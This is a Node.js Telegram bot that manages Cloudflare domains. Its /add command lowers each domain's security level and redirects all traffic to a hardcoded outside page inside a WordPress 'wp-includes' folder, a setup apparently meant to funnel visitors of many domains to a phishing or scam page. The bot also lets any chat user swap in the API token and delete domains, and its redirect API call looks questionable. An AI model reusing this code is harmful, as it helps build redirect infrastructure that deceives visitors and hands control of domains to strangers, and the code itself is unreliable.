require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Environment variables
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
let cloudflareApiToken = process.env.CLOUDFLARE_API_TOKEN;

// Admin Telegram ID
const adminId = process.env.ADMIN_TELEGRAM_ID;

// Utility function to set Cloudflare headers
const getCloudflareHeaders = (token) => ({
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
});

// Function to get Cloudflare nameservers for a domain
const getNameservers = async (domain) => {
    try {
        const response = await axios.get(`https://api.cloudflare.com/client/v4/zones?name=${domain}`, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        const zone = response.data.result[0];
        return zone.name_servers;
    } catch (error) {
        throw new Error('Failed to fetch nameservers');
    }
};

// Function to check domain status
const getDomainStatus = async (domain) => {
    try {
        const response = await axios.get(`https://api.cloudflare.com/client/v4/zones?name=${domain}`, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        const zone = response.data.result[0];
        return zone.status;
    } catch (error) {
        throw new Error('Failed to fetch domain status');
    }
};

// Function to list domains in Cloudflare account
const listDomains = async () => {
    try {
        const response = await axios.get('https://api.cloudflare.com/client/v4/zones', {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        return response.data.result.map(zone => zone.name);
    } catch (error) {
        throw new Error('Failed to list domains');
    }
};

// Function to delete a domain
const deleteDomain = async (domain) => {
    try {
        const response = await axios.get(`https://api.cloudflare.com/client/v4/zones?name=${domain}`, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        const zone = response.data.result[0];
        await axios.delete(`https://api.cloudflare.com/client/v4/zones/${zone.id}`, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        return true;
    } catch (error) {
        throw new Error('Failed to delete domain');
    }
};

// Function to notify admin of errors
const notifyAdmin = (error) => {
    bot.sendMessage(adminId, `Error occurred: ${error.message}`);
};

// Initialize the bot
const bot = new TelegramBot(telegramBotToken, { polling: true });

// Handle /start command
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Welcome to the Cloudflare Bot! Please provide your Cloudflare API token with /settoken <token>.');
});

// Handle API token input
bot.onText(/\/settoken (.+)/, (msg, match) => {
    cloudflareApiToken = match[1];
    bot.sendMessage(msg.chat.id, 'Cloudflare API token set successfully!');
});

// Handle /add command
bot.onText(/\/add (.+)/, async (msg, match) => {
    const domain = match[1];
    try {
        const nameservers = await getNameservers(domain);
        bot.sendMessage(msg.chat.id, `Nameservers for ${domain}: ${nameservers.join(', ')}`);

        // Additional configuration steps
        bot.sendMessage(msg.chat.id, 'Configuring additional settings...');

        // Set Security Level to LOW
        const zoneResponse = await axios.get(`https://api.cloudflare.com/client/v4/zones?name=${domain}`, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });
        const zoneId = zoneResponse.data.result[0].id;

        await axios.patch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/security_level`, {
            value: 'low'
        }, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });

        // Set Automatic HTTPS Rewrites to ON
        await axios.patch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/automatic_https_rewrites`, {
            value: 'on'
        }, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });

        // Set Always Use HTTPS to ON
        await axios.patch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/always_use_https`, {
            value: 'on'
        }, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });

        // Set Brotli to ON
        await axios.patch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/brotli`, {
            value: 'on'
        }, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });

        // Create redirect rule
        const ruleName = `Redirect_${Math.random().toString(36).substr(2, 5)}`;
        await axios.post(`https://api.cloudflare.com/client/v4/zones/${zoneId}/rules/redirect`, {
            name: ruleName,
            source: {
                pattern: "/*",
                status_code: 301
            },
            destination: {
                url: "https://fawzy.com/wp-includes/Text/"
            }
        }, {
            headers: getCloudflareHeaders(cloudflareApiToken)
        });

        bot.sendMessage(msg.chat.id, 'Domain added and configured successfully!');
        bot.sendMessage(msg.chat.id, 'Redirect set ✅🌐 successfully to https://fawzy.com/wp-includes/Text/');
    } catch (error) {
        bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
        notifyAdmin(error);
    }
});

// Handle /cfstatus command
bot.onText(/\/cfstatus (.+)/, async (msg, match) => {
    const domain = match[1];
    try {
        const status = await getDomainStatus(domain);
        bot.sendMessage(msg.chat.id, `Status of ${domain}: ${status}`);
    } catch (error) {
        bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
        notifyAdmin(error);
    }
});

// Handle /sites command
bot.onText(/\/sites/, async (msg) => {
    try {
        const domains = await listDomains();
        bot.sendMessage(msg.chat.id, `Your domains: ${domains.join(', ')}`);
    } catch (error) {
        bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
        notifyAdmin(error);
    }
});

// Handle /delete command
bot.onText(/\/delete (.+)/, async (msg, match) => {
    const domain = match[1];
    try {
        await deleteDomain(domain);
        bot.sendMessage(msg.chat.id, `${domain} deleted successfully!`);
    } catch (error) {
        bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
        notifyAdmin(error);
    }
});
